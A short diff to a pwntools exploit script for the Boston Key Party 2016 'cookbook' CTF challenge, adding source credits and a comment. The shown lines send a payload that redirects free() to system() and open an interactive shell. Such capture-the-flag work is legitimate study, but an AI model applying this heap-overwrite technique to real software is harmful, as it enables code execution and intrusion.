@@ -2,7 +2,9 @@
 #
 # Boston Key Party 2016 pwnable cookbook
 #
-# Based on http://yum3.tistory.com/48
+# Based on 
+# * http://yum3.tistory.com/48
+# * https://gist.github.com/stephenR/cdfa396aa40c22a3180c
 #
 
 from pwn import *
@@ -159,5 +161,4 @@ if __name__ == "__main__":
     s('a')
     s('g')
     s('sh; ' + p32(0) + p32(SYSTEM_ADDR) * 32)
-    r.interactive()
-
+    r.interactive() # free("sh; \x00") => system("sh; \x00")
